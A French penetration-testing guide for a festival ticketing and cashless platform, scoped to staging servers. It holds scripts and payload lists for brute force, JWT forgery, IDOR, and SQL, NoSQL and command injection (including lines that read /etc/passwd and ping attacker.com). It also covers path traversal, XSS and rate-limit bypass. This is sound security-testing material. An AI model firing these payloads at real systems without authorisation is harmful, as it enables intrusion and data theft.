# Guide Complet de Penetration Testing - Festival Management Platform

**Version:** 2.0
**Date:** 2026-01-02
**Classification:** Confidentiel
**Auteur:** Security Team

---

## Table des Matieres

1. [Introduction](#1-introduction)
2. [Preparation du Test](#2-preparation-du-test)
3. [Tests d'Authentification](#3-tests-dauthentification)
4. [Tests d'Autorisation (RBAC)](#4-tests-dautorisation-rbac)
5. [Tests API](#5-tests-api)
6. [Tests de Paiement](#6-tests-de-paiement)
7. [Tests Cashless/NFC](#7-tests-cashlessnfc)
8. [Tests Mobile](#8-tests-mobile)
9. [Tests Infrastructure](#9-tests-infrastructure)
10. [Tests OWASP Top 10](#10-tests-owasp-top-10)
11. [Outils et Scripts](#11-outils-et-scripts)
12. [Rapport et Remediation](#12-rapport-et-remediation)

---

## 1. Introduction

### 1.1 Objectifs du Guide

Ce guide fournit une methodologie complete pour effectuer des tests de penetration sur la plateforme Festival Management. Il couvre tous les aspects critiques:

- **Billetterie** - Achat, validation QR, annulation
- **Paiements** - Integration Stripe, webhooks
- **Cashless** - Portefeuille prepaye, transactions NFC
- **Multi-tenant** - Isolation des donnees entre festivals
- **RBAC** - Controle d'acces base sur les roles

### 1.2 Criticite des Composants

| Composant | Criticite | Donnees Sensibles | Conformite |
|-----------|-----------|-------------------|------------|
| Auth/JWT | Critique | Credentials, tokens | - |
| Paiements | Critique | Cartes bancaires | PCI-DSS |
| Users | Haute | PII, emails | GDPR |
| Cashless | Haute | Soldes, transactions | - |
| Tickets | Haute | QR codes | - |
| Staff | Moyenne | Planning, badges | - |
| Analytics | Basse | Metriques agregees | - |

### 1.3 Environnements de Test

```
Production:  https://api.festival-platform.com     (INTERDIT)
Staging:     https://staging-api.festival.io       (Tests autorises)
Development: https://dev-api.festival.local        (Tests autorises)
Local:       http://localhost:3000                 (Tests autorises)
```

---

## 2. Preparation du Test

### 2.1 Checklist Pre-Test

```bash
# Verifier l'environnement cible
curl -s https://staging-api.festival.io/api/health | jq

# Verifier la documentation API
curl -s https://staging-api.festival.io/api/docs-json | jq '.info'

# Preparer les comptes de test
# Admin:    admin@test.festival.io / TestAdmin123!
# Organizer: organizer@test.festival.io / TestOrg123!
# Staff:    staff@test.festival.io / TestStaff123!
# Cashier:  cashier@test.festival.io / TestCash123!
# Security: security@test.festival.io / TestSec123!
# User:     user@test.festival.io / TestUser123!
```

### 2.2 Configuration Burp Suite

```json
{
  "project_options": {
    "connections": {
      "platform_authentication": {
        "use_user_options": true
      }
    },
    "sessions": {
      "session_handling_rules": [
        {
          "enabled": true,
          "rule_name": "JWT Token Refresh",
          "scope": {
            "include_all_urls": true
          },
          "actions": [
            {
              "action_type": "run_macro",
              "macro_name": "Get JWT Token"
            }
          ]
        }
      ],
      "macros": [
        {
          "name": "Get JWT Token",
          "items": [
            {
              "request": {
                "method": "POST",
                "url": "/api/auth/login",
                "body": "{\"email\":\"user@test.festival.io\",\"password\":\"TestUser123!\"}"
              }
            }
          ]
        }
      ]
    }
  }
}
```

### 2.3 Configuration OWASP ZAP

```yaml
# zap-config.yaml
env:
  contexts:
    - name: "Festival API"
      urls:
        - "https://staging-api.festival.io"
      includePaths:
        - "https://staging-api.festival.io/api/.*"
      excludePaths:
        - "https://staging-api.festival.io/api/docs.*"
      authentication:
        method: "json"
        loginUrl: "https://staging-api.festival.io/api/auth/login"
        loginRequestData: '{"email":"{%username%}","password":"{%password%}"}'
        tokenLocation: "accessToken"
        tokenExtract: '$.accessToken'
      users:
        - name: "admin"
          credentials:
            username: "admin@test.festival.io"
            password: "TestAdmin123!"
        - name: "user"
          credentials:
            username: "user@test.festival.io"
            password: "TestUser123!"
```

---

## 3. Tests d'Authentification

### 3.1 Test de Brute Force

```bash
# Test avec Hydra
hydra -l user@test.festival.io -P /usr/share/wordlists/rockyou.txt \
  https://staging-api.festival.io/api/auth/login \
  http-post-form "email=^USER^&password=^PASS^:Invalid credentials"

# Verification du rate limiting
for i in {1..50}; do
  curl -s -X POST https://staging-api.festival.io/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    -w "%{http_code}\n" -o /dev/null
  sleep 0.1
done

# Resultat attendu: 429 (Too Many Requests) apres 5-10 tentatives
```

### 3.2 Test JWT Token

```python
#!/usr/bin/env python3
"""
jwt_test.py - Tests de securite JWT
"""
import jwt
import requests
import json
from datetime import datetime, timedelta

BASE_URL = "https://staging-api.festival.io"

def get_token():
    """Obtenir un token valide"""
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_jwt_none_algorithm(token):
    """Test CVE-2015-9235 - Algorithm None"""
    try:
        # Decoder sans verification
        payload = jwt.decode(token, options={"verify_signature": False})

        # Re-encoder avec algorithm none
        fake_token = jwt.encode(payload, key="", algorithm="none")

        # Tester
        resp = requests.get(f"{BASE_URL}/api/auth/me",
                          headers={"Authorization": f"Bearer {fake_token}"})

        if resp.status_code == 200:
            print("[CRITIQUE] Vulnerable a l'algorithme 'none'!")
        else:
            print("[OK] Protection contre l'algorithme 'none'")
    except Exception as e:
        print(f"[OK] Token rejete: {e}")

def test_jwt_key_confusion(token):
    """Test d'attaque RS256 -> HS256"""
    try:
        payload = jwt.decode(token, options={"verify_signature": False})

        # Essayer de signer avec la cle publique
        public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

        fake_token = jwt.encode(payload, public_key, algorithm="HS256")

        resp = requests.get(f"{BASE_URL}/api/auth/me",
                          headers={"Authorization": f"Bearer {fake_token}"})

        if resp.status_code == 200:
            print("[CRITIQUE] Vulnerable a la confusion RS256/HS256!")
        else:
            print("[OK] Protection contre la confusion d'algorithme")
    except Exception as e:
        print(f"[OK] Token rejete: {e}")

def test_jwt_expiration(token):
    """Test d'expiration du token"""
    payload = jwt.decode(token, options={"verify_signature": False})

    exp = datetime.fromtimestamp(payload.get("exp", 0))
    now = datetime.now()

    ttl = (exp - now).total_seconds()

    if ttl > 3600:  # Plus d'1 heure
        print(f"[WARNING] TTL trop long: {ttl/3600:.1f} heures")
    else:
        print(f"[OK] TTL correct: {ttl/60:.0f} minutes")

def test_jwt_sensitive_data(token):
    """Verifier les donnees sensibles dans le JWT"""
    payload = jwt.decode(token, options={"verify_signature": False})

    sensitive_fields = ["password", "card", "ssn", "secret", "apiKey"]
    found = []

    for field in sensitive_fields:
        if field.lower() in str(payload).lower():
            found.append(field)

    if found:
        print(f"[CRITIQUE] Donnees sensibles dans JWT: {found}")
    else:
        print("[OK] Pas de donnees sensibles dans le JWT")

    print(f"[INFO] Payload: {json.dumps(payload, indent=2)}")

def test_refresh_token():
    """Test du refresh token"""
    # Login pour obtenir les tokens
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    data = resp.json()

    access_token = data.get("accessToken")
    refresh_token = data.get("refreshToken")

    # Test 1: Utiliser le refresh token
    resp = requests.post(f"{BASE_URL}/api/auth/refresh",
                        headers={"Authorization": f"Bearer {refresh_token}"})

    if resp.status_code == 200:
        print("[OK] Refresh token fonctionne")
        new_tokens = resp.json()

        # Test 2: L'ancien access token doit etre invalide
        resp2 = requests.get(f"{BASE_URL}/api/auth/me",
                           headers={"Authorization": f"Bearer {access_token}"})

        # Note: Selon implementation, l'ancien token peut encore etre valide
        # jusqu'a expiration

        # Test 3: Le refresh token ne doit pas etre reutilisable
        resp3 = requests.post(f"{BASE_URL}/api/auth/refresh",
                            headers={"Authorization": f"Bearer {refresh_token}"})

        if resp3.status_code == 200:
            print("[WARNING] Refresh token reutilisable (rotation non implementee)")
        else:
            print("[OK] Rotation du refresh token implementee")
    else:
        print(f"[ERROR] Refresh token echoue: {resp.status_code}")

if __name__ == "__main__":
    print("=== Tests JWT Festival Platform ===\n")

    token = get_token()
    if not token:
        print("Impossible d'obtenir un token")
        exit(1)

    test_jwt_none_algorithm(token)
    test_jwt_key_confusion(token)
    test_jwt_expiration(token)
    test_jwt_sensitive_data(token)
    test_refresh_token()
```

### 3.3 Test Password Reset

```bash
# Test 1: Enumeration des utilisateurs
curl -X POST https://staging-api.festival.io/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"existing@user.com"}'
# Response doit etre identique pour email existant ou non

# Test 2: Token previsible
# Capturer plusieurs tokens de reset et analyser le pattern
# Verifier si le token contient des donnees previsibles (timestamp, userId)

# Test 3: Expiration du token
# Le token doit expirer apres 1 heure max

# Test 4: Reutilisation du token
# Un token ne doit pas etre reutilisable apres changement
```

### 3.4 Test Session Management

```python
#!/usr/bin/env python3
"""
session_test.py - Tests de gestion de session
"""
import requests

BASE_URL = "https://staging-api.festival.io"

def test_session_fixation():
    """Test de fixation de session"""
    # Obtenir un token avant login
    # Non applicable pour JWT (pas de session cote serveur)
    print("[N/A] Session fixation non applicable pour JWT")

def test_concurrent_sessions():
    """Test des sessions simultanees"""
    # Login depuis "appareil 1"
    resp1 = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    token1 = resp1.json().get("accessToken")

    # Login depuis "appareil 2"
    resp2 = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    token2 = resp2.json().get("accessToken")

    # Les deux tokens doivent fonctionner (comportement attendu pour mobile)
    resp1_check = requests.get(f"{BASE_URL}/api/auth/me",
                               headers={"Authorization": f"Bearer {token1}"})
    resp2_check = requests.get(f"{BASE_URL}/api/auth/me",
                               headers={"Authorization": f"Bearer {token2}"})

    if resp1_check.status_code == 200 and resp2_check.status_code == 200:
        print("[INFO] Sessions simultanees autorisees (normal pour mobile)")
    else:
        print("[INFO] Une seule session autorisee")

def test_logout_invalidation():
    """Test d'invalidation apres logout"""
    # Login
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    token = resp.json().get("accessToken")

    # Logout
    requests.post(f"{BASE_URL}/api/auth/logout",
                 headers={"Authorization": f"Bearer {token}"})

    # Tenter d'utiliser le token
    resp_check = requests.get(f"{BASE_URL}/api/auth/me",
                             headers={"Authorization": f"Bearer {token}"})

    if resp_check.status_code == 401:
        print("[OK] Token invalide apres logout")
    else:
        print("[WARNING] Token encore valide apres logout (blacklist necessaire)")

if __name__ == "__main__":
    test_session_fixation()
    test_concurrent_sessions()
    test_logout_invalidation()
```

---

## 4. Tests d'Autorisation (RBAC)

### 4.1 Matrice des Permissions

| Endpoint | ADMIN | ORGANIZER | STAFF | CASHIER | SECURITY | USER |
|----------|-------|-----------|-------|---------|----------|------|
| GET /users | OK | 403 | 403 | 403 | 403 | 403 |
| POST /festivals | OK | OK | 403 | 403 | 403 | 403 |
| POST /tickets/validate | OK | OK | OK | 403 | OK | 403 |
| POST /cashless/pay | OK | OK | OK | OK | 403 | 403 |
| GET /tickets/me | OK | OK | OK | OK | OK | OK |

### 4.2 Script de Test RBAC

```python
#!/usr/bin/env python3
"""
rbac_test.py - Tests complets RBAC
"""
import requests
import json

BASE_URL = "https://staging-api.festival.io"

# Credentials par role
USERS = {
    "ADMIN": {"email": "admin@test.festival.io", "password": "TestAdmin123!"},
    "ORGANIZER": {"email": "organizer@test.festival.io", "password": "TestOrg123!"},
    "STAFF": {"email": "staff@test.festival.io", "password": "TestStaff123!"},
    "CASHIER": {"email": "cashier@test.festival.io", "password": "TestCash123!"},
    "SECURITY": {"email": "security@test.festival.io", "password": "TestSec123!"},
    "USER": {"email": "user@test.festival.io", "password": "TestUser123!"},
}

# Endpoints a tester avec permission attendue
ENDPOINTS = [
    # (method, path, body, required_role)
    ("GET", "/api/users", None, "ADMIN"),
    ("GET", "/api/users/stats", None, "ADMIN"),
    ("POST", "/api/festivals", {"name": "Test", "startDate": "2026-06-01"}, "ORGANIZER"),
    ("PUT", "/api/festivals/{festival_id}", {"name": "Updated"}, "ORGANIZER"),
    ("DELETE", "/api/festivals/{festival_id}", None, "ADMIN"),
    ("POST", "/api/tickets/validate", {"qrCode": "test"}, "STAFF"),
    ("POST", "/api/cashless/pay", {"amount": 10, "vendorId": "xxx"}, "CASHIER"),
    ("POST", "/api/cashless/topup", {"amount": 50}, "USER"),
    ("GET", "/api/tickets/me", None, "USER"),
    ("GET", "/api/analytics/dashboard", None, "ORGANIZER"),
    ("POST", "/api/staff", {"userId": "xxx", "role": "SECURITY"}, "ORGANIZER"),
    ("GET", "/api/zones", None, "STAFF"),
    ("POST", "/api/zones/{zone_id}/scan", {"ticketId": "xxx"}, "SECURITY"),
]

def get_token(role):
    """Obtenir un token pour un role"""
    creds = USERS.get(role)
    if not creds:
        return None

    resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
    if resp.status_code == 200:
        return resp.json().get("accessToken")
    return None

def test_endpoint(method, path, body, token):
    """Tester un endpoint avec un token"""
    headers = {"Authorization": f"Bearer {token}"} if token else {}

    if method == "GET":
        resp = requests.get(f"{BASE_URL}{path}", headers=headers)
    elif method == "POST":
        resp = requests.post(f"{BASE_URL}{path}", json=body, headers=headers)
    elif method == "PUT":
        resp = requests.put(f"{BASE_URL}{path}", json=body, headers=headers)
    elif method == "DELETE":
        resp = requests.delete(f"{BASE_URL}{path}", headers=headers)

    return resp.status_code

def run_rbac_tests():
    """Executer tous les tests RBAC"""
    # Obtenir les tokens
    tokens = {}
    for role in USERS.keys():
        tokens[role] = get_token(role)
        if not tokens[role]:
            print(f"[WARNING] Impossible d'obtenir token pour {role}")

    results = []

    # Hierarchie des roles
    HIERARCHY = {
        "ADMIN": ["ADMIN"],
        "ORGANIZER": ["ADMIN", "ORGANIZER"],
        "STAFF": ["ADMIN", "ORGANIZER", "STAFF"],
        "CASHIER": ["ADMIN", "ORGANIZER", "CASHIER"],
        "SECURITY": ["ADMIN", "ORGANIZER", "SECURITY"],
        "USER": ["ADMIN", "ORGANIZER", "STAFF", "CASHIER", "SECURITY", "USER"],
    }

    print("\n=== Tests RBAC Festival Platform ===\n")

    for method, path, body, min_role in ENDPOINTS:
        print(f"\n{method} {path} (min: {min_role})")

        allowed_roles = HIERARCHY.get(min_role, [min_role])

        for role, token in tokens.items():
            if not token:
                continue

            status = test_endpoint(method, path, body, token)

            expected_ok = role in allowed_roles
            actual_ok = status in [200, 201, 204]

            if expected_ok and not actual_ok:
                print(f"  [{role}] FAIL - Expected OK, got {status}")
                results.append(("FAIL", role, path, "should_allow"))
            elif not expected_ok and actual_ok:
                print(f"  [{role}] CRITICAL - Unauthorized access! Got {status}")
                results.append(("CRITICAL", role, path, "unauthorized_access"))
            elif expected_ok and actual_ok:
                print(f"  [{role}] OK - {status}")
            else:
                print(f"  [{role}] OK - Blocked ({status})")

    # Resume
    print("\n=== Resume ===")
    critical = [r for r in results if r[0] == "CRITICAL"]
    fails = [r for r in results if r[0] == "FAIL"]

    if critical:
        print(f"\n[CRITIQUE] {len(critical)} acces non autorises detectes:")
        for c in critical:
            print(f"  - {c[1]} a acces a {c[2]}")

    if fails:
        print(f"\n[WARNING] {len(fails)} permissions manquantes:")
        for f in fails:
            print(f"  - {f[1]} n'a pas acces a {f[2]}")

    if not critical and not fails:
        print("\n[OK] Tous les tests RBAC passes avec succes")

if __name__ == "__main__":
    run_rbac_tests()
```

### 4.3 Tests IDOR (Insecure Direct Object Reference)

```python
#!/usr/bin/env python3
"""
idor_test.py - Tests IDOR
"""
import requests
import uuid

BASE_URL = "https://staging-api.festival.io"

def get_tokens():
    """Obtenir tokens pour 2 utilisateurs differents"""
    users = [
        {"email": "user1@test.festival.io", "password": "TestUser123!"},
        {"email": "user2@test.festival.io", "password": "TestUser123!"},
    ]

    tokens = []
    for user in users:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=user)
        if resp.status_code == 200:
            data = resp.json()
            tokens.append({
                "token": data.get("accessToken"),
                "userId": data.get("user", {}).get("id")
            })

    return tokens

def test_ticket_idor():
    """Test IDOR sur les tickets"""
    tokens = get_tokens()
    if len(tokens) < 2:
        print("[SKIP] Besoin de 2 utilisateurs")
        return

    user1, user2 = tokens[0], tokens[1]

    # User1 cree/achete un ticket
    # (On suppose qu'un ticket existe deja pour user1)

    # Obtenir les tickets de user1
    resp = requests.get(f"{BASE_URL}/api/tickets/me",
                       headers={"Authorization": f"Bearer {user1['token']}"})

    if resp.status_code == 200 and resp.json():
        ticket_id = resp.json()[0].get("id")

        # User2 tente d'acceder au ticket de user1
        resp2 = requests.get(f"{BASE_URL}/api/tickets/{ticket_id}",
                           headers={"Authorization": f"Bearer {user2['token']}"})

        if resp2.status_code == 200:
            print(f"[CRITIQUE] IDOR detecte! User2 peut voir ticket de User1")
        elif resp2.status_code in [403, 404]:
            print(f"[OK] Protection IDOR - Acces refuse ({resp2.status_code})")

        # User2 tente d'annuler le ticket de user1
        resp3 = requests.post(f"{BASE_URL}/api/tickets/{ticket_id}/cancel",
                            headers={"Authorization": f"Bearer {user2['token']}"})

        if resp3.status_code in [200, 201]:
            print(f"[CRITIQUE] IDOR critique! User2 peut annuler ticket de User1")
        else:
            print(f"[OK] Protection IDOR annulation ({resp3.status_code})")

def test_cashless_idor():
    """Test IDOR sur les comptes cashless"""
    tokens = get_tokens()
    if len(tokens) < 2:
        print("[SKIP] Besoin de 2 utilisateurs")
        return

    user1, user2 = tokens[0], tokens[1]

    # Obtenir le compte cashless de user1
    resp = requests.get(f"{BASE_URL}/api/cashless/balance",
                       headers={"Authorization": f"Bearer {user1['token']}"})

    if resp.status_code == 200:
        account_id = resp.json().get("accountId")

        # User2 tente d'acceder au solde de user1
        resp2 = requests.get(f"{BASE_URL}/api/cashless/account/{account_id}",
                           headers={"Authorization": f"Bearer {user2['token']}"})

        if resp2.status_code == 200:
            print(f"[CRITIQUE] IDOR detecte sur compte cashless!")
        else:
            print(f"[OK] Protection IDOR cashless ({resp2.status_code})")

def test_parameter_tampering():
    """Test de manipulation de parametres"""
    tokens = get_tokens()
    if not tokens:
        return

    user = tokens[0]

    # Test 1: Modifier l'userId dans la requete
    resp = requests.put(f"{BASE_URL}/api/users/profile",
                       headers={"Authorization": f"Bearer {user['token']}"},
                       json={
                           "id": str(uuid.uuid4()),  # Faux ID
                           "name": "Hacked"
                       })

    # Le serveur doit ignorer l'ID et utiliser celui du token

    # Test 2: Modifier le festivalId pour acceder a un autre festival
    fake_festival_id = str(uuid.uuid4())
    resp2 = requests.get(f"{BASE_URL}/api/festivals/{fake_festival_id}/tickets",
                        headers={"Authorization": f"Bearer {user['token']}"})

    if resp2.status_code == 200:
        print("[WARNING] Acces possible a un festival non autorise")
    else:
        print(f"[OK] Acces festival refuse ({resp2.status_code})")

if __name__ == "__main__":
    print("=== Tests IDOR ===\n")
    test_ticket_idor()
    test_cashless_idor()
    test_parameter_tampering()
```

### 4.4 Test Multi-Tenant Isolation

```python
#!/usr/bin/env python3
"""
multitenant_test.py - Tests d'isolation multi-tenant
"""
import requests

BASE_URL = "https://staging-api.festival.io"

def test_cross_festival_access():
    """Verifier l'isolation entre festivals"""

    # Login comme organisateur du Festival A
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "organizer-a@test.festival.io",
        "password": "TestOrg123!"
    })
    token_a = resp.json().get("accessToken")
    festival_a_id = "uuid-festival-a"

    # Login comme organisateur du Festival B
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "organizer-b@test.festival.io",
        "password": "TestOrg123!"
    })
    token_b = resp.json().get("accessToken")
    festival_b_id = "uuid-festival-b"

    # Organizer A tente d'acceder aux donnees du Festival B
    tests = [
        ("GET", f"/api/festivals/{festival_b_id}"),
        ("GET", f"/api/festivals/{festival_b_id}/tickets"),
        ("GET", f"/api/festivals/{festival_b_id}/analytics"),
        ("GET", f"/api/festivals/{festival_b_id}/staff"),
        ("PUT", f"/api/festivals/{festival_b_id}"),
        ("DELETE", f"/api/festivals/{festival_b_id}"),
    ]

    print("=== Test Isolation Multi-Tenant ===\n")

    for method, path in tests:
        if method == "GET":
            resp = requests.get(f"{BASE_URL}{path}",
                              headers={"Authorization": f"Bearer {token_a}"})
        elif method == "PUT":
            resp = requests.put(f"{BASE_URL}{path}",
                              headers={"Authorization": f"Bearer {token_a}"},
                              json={"name": "Hacked"})
        elif method == "DELETE":
            resp = requests.delete(f"{BASE_URL}{path}",
                                 headers={"Authorization": f"Bearer {token_a}"})

        if resp.status_code in [200, 201, 204]:
            print(f"[CRITIQUE] {method} {path} - Acces cross-tenant!")
        elif resp.status_code in [403, 404]:
            print(f"[OK] {method} {path} - Bloque ({resp.status_code})")
        else:
            print(f"[INFO] {method} {path} - {resp.status_code}")

if __name__ == "__main__":
    test_cross_festival_access()
```

---

## 5. Tests API

### 5.1 Tests d'Injection

```python
#!/usr/bin/env python3
"""
injection_test.py - Tests d'injection SQL, NoSQL, Command
"""
import requests
import json

BASE_URL = "https://staging-api.festival.io"

# Payloads SQL Injection
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1; SELECT * FROM users",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
]

# Payloads NoSQL Injection
NOSQL_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$where": "1==1"},
    {"$regex": ".*"},
]

# Payloads Command Injection
CMD_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "|| ping -c 10 attacker.com",
]

def get_token():
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_sql_injection():
    """Test SQL Injection sur les endpoints de recherche"""
    token = get_token()

    print("\n=== Tests SQL Injection ===\n")

    endpoints = [
        "/api/users?search=",
        "/api/festivals?name=",
        "/api/tickets?code=",
    ]

    for endpoint in endpoints:
        for payload in SQL_PAYLOADS:
            url = f"{BASE_URL}{endpoint}{payload}"
            resp = requests.get(url, headers={"Authorization": f"Bearer {token}"})

            # Analyser la reponse
            if resp.status_code == 500:
                print(f"[WARNING] {endpoint} - Erreur 500 avec: {payload[:20]}...")
            elif "error" in resp.text.lower() and "sql" in resp.text.lower():
                print(f"[CRITIQUE] {endpoint} - Erreur SQL exposee: {payload[:20]}...")
            elif resp.status_code == 200 and len(resp.json()) > 100:
                print(f"[WARNING] {endpoint} - Reponse anormale: {payload[:20]}...")

def test_nosql_injection():
    """Test NoSQL Injection"""
    token = get_token()

    print("\n=== Tests NoSQL Injection ===\n")

    # Test sur login
    for payload in NOSQL_PAYLOADS:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": payload,
            "password": payload
        })

        if resp.status_code == 200:
            print(f"[CRITIQUE] NoSQL injection sur login: {payload}")
        else:
            print(f"[OK] Payload rejete: {payload}")

def test_command_injection():
    """Test Command Injection"""
    token = get_token()

    print("\n=== Tests Command Injection ===\n")

    # Endpoints susceptibles (upload, export, etc.)
    for payload in CMD_PAYLOADS:
        # Test sur export filename
        resp = requests.get(
            f"{BASE_URL}/api/analytics/export?filename=report{payload}",
            headers={"Authorization": f"Bearer {token}"}
        )

        if "uid=" in resp.text or "root:" in resp.text:
            print(f"[CRITIQUE] Command injection detectee: {payload}")

def test_path_traversal():
    """Test Path Traversal"""
    token = get_token()

    print("\n=== Tests Path Traversal ===\n")

    payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
    ]

    for payload in payloads:
        resp = requests.get(
            f"{BASE_URL}/api/files/{payload}",
            headers={"Authorization": f"Bearer {token}"}
        )

        if "root:" in resp.text or resp.status_code == 200:
            print(f"[CRITIQUE] Path traversal: {payload}")
        else:
            print(f"[OK] Bloque: {payload[:30]}...")

if __name__ == "__main__":
    test_sql_injection()
    test_nosql_injection()
    test_command_injection()
    test_path_traversal()
```

### 5.2 Tests XSS

```python
#!/usr/bin/env python3
"""
xss_test.py - Tests XSS (Cross-Site Scripting)
"""
import requests

BASE_URL = "https://staging-api.festival.io"

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert("XSS")}',
    '<a href="javascript:alert(\'XSS\')">click</a>',
]

def get_token():
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_stored_xss():
    """Test Stored XSS"""
    token = get_token()

    print("\n=== Tests Stored XSS ===\n")

    for payload in XSS_PAYLOADS:
        # Test sur profil utilisateur
        resp = requests.put(f"{BASE_URL}/api/users/profile",
                          headers={"Authorization": f"Bearer {token}"},
                          json={"name": payload})

        # Recuperer et verifier si le payload est stocke tel quel
        resp2 = requests.get(f"{BASE_URL}/api/users/profile",
                           headers={"Authorization": f"Bearer {token}"})

        if resp2.status_code == 200:
            data = resp2.json()
            if payload in data.get("name", ""):
                print(f"[CRITIQUE] Stored XSS possible: {payload[:30]}...")
            elif "<" not in data.get("name", "") and "script" not in data.get("name", "").lower():
                print(f"[OK] Payload sanitise")

def test_reflected_xss():
    """Test Reflected XSS"""
    token = get_token()

    print("\n=== Tests Reflected XSS ===\n")

    for payload in XSS_PAYLOADS:
        # Test sur recherche
        resp = requests.get(f"{BASE_URL}/api/festivals?search={payload}",
                          headers={"Authorization": f"Bearer {token}"})

        if payload in resp.text:
            print(f"[CRITIQUE] Reflected XSS: {payload[:30]}...")

def test_dom_xss():
    """Test DOM-based XSS (via API)"""
    print("\n=== Tests DOM XSS ===\n")
    print("[INFO] DOM XSS doit etre teste via le frontend")
    print("       Verifier les endpoints retournant du HTML")

if __name__ == "__main__":
    test_stored_xss()
    test_reflected_xss()
    test_dom_xss()
```

### 5.3 Tests Rate Limiting

```bash
#!/bin/bash
# rate_limit_test.sh - Test du rate limiting

BASE_URL="https://staging-api.festival.io"

echo "=== Test Rate Limiting ==="

# Test 1: Login endpoint (doit etre tres restrictif)
echo -e "\n[Test] Login endpoint (limite: 5 req/min)"
for i in {1..20}; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrong"}')
    echo "Request $i: $status"
    if [ "$status" == "429" ]; then
        echo "[OK] Rate limit active apres $i requetes"
        break
    fi
done

# Test 2: API generale
echo -e "\n[Test] API generale (limite: 100 req/min)"
TOKEN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.festival.io","password":"TestUser123!"}' \
    | jq -r '.accessToken')

count=0
for i in {1..200}; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X GET "$BASE_URL/api/festivals" \
        -H "Authorization: Bearer $TOKEN")
    if [ "$status" == "429" ]; then
        echo "[OK] Rate limit active apres $i requetes"
        count=$i
        break
    fi
done

if [ $count -eq 0 ]; then
    echo "[WARNING] Pas de rate limiting detecte apres 200 requetes"
fi

# Test 3: Bypass attempts
echo -e "\n[Test] Tentatives de bypass"

# X-Forwarded-For spoofing
for ip in "192.168.1.{1..10}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $ip" \
        -d '{"email":"test@test.com","password":"wrong"}')
    echo "X-Forwarded-For: $ip -> $status"
done

echo -e "\n[INFO] Si tous retournent 429, le bypass X-Forwarded-For est bloque"
```

---

## 6. Tests de Paiement

### 6.1 Tests Stripe Integration

```python
#!/usr/bin/env python3
"""
payment_test.py - Tests de securite paiement
"""
import requests
import json
import hmac
import hashlib
import time

BASE_URL = "https://staging-api.festival.io"

def get_token():
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_price_manipulation():
    """Test de manipulation des prix"""
    token = get_token()

    print("\n=== Test Manipulation Prix ===\n")

    # Test 1: Envoyer un prix different dans la requete
    resp = requests.post(f"{BASE_URL}/api/tickets/buy",
                        headers={"Authorization": f"Bearer {token}"},
                        json={
                            "categoryId": "uuid-category",
                            "quantity": 1,
                            "price": 0.01  # Prix manipule
                        })

    if resp.status_code == 200:
        data = resp.json()
        if data.get("amount") == 0.01:
            print("[CRITIQUE] Prix manipulable cote client!")
        else:
            print("[OK] Prix calcule cote serveur")

    # Test 2: Quantite negative
    resp2 = requests.post(f"{BASE_URL}/api/tickets/buy",
                         headers={"Authorization": f"Bearer {token}"},
                         json={
                             "categoryId": "uuid-category",
                             "quantity": -5
                         })

    if resp2.status_code in [200, 201]:
        print("[CRITIQUE] Quantite negative acceptee!")
    else:
        print("[OK] Quantite negative rejetee")

def test_webhook_signature():
    """Test de verification signature webhook"""
    print("\n=== Test Webhook Signature ===\n")

    # Test 1: Webhook sans signature
    resp = requests.post(f"{BASE_URL}/api/webhooks/stripe",
                        json={"type": "payment_intent.succeeded"})

    if resp.status_code == 200:
        print("[CRITIQUE] Webhook accepte sans signature!")
    else:
        print(f"[OK] Webhook sans signature rejete ({resp.status_code})")

    # Test 2: Webhook avec fausse signature
